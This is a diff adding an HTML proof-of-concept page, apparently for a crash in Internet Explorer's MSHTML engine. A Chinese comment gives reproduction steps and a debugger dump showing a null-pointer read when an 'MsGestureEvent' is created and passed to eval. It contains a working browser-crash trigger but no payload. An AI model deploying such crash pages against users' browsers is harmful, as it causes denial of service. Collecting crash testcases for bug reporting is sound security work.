@@ -1,0 +1,23 @@
+<html>
+    <!--
+        下面的代码需要在F12 (控制台调试状态下才可以引发异常)
+        1.  直接在JavaScript 控制台输入下面的代码:
+            var a=document.createEvent('MsGestureEvent');
+            a
+        2.  在代码var a 设置断点并且使用F10 单步执行
+
+        Crash Information :
+        First chance exceptions are reported before any exception handling. 
+        This exception may be expected and handled. 
+        eax=044793a4 ebx=00000000 ecx=00000000 edx=00000000 esi=00000000 edi=244863c0 
+        eip=69102b59 esp=0447936c ebp=04479388 iopl=0         nv up ei pl nz na pe nc 
+        cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206 
+        *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\MSHTML.dll - 
+        MSHTML+0xb2b59: 
+        69102b59 8b4b18          mov     ecx,dword ptr [ebx+18h] ds:0023:00000018=????????
+    -->
+    <script>
+        var a=document.createEvent('MsGestureEvent');
+        eval(a);
+    </script>
+</html>
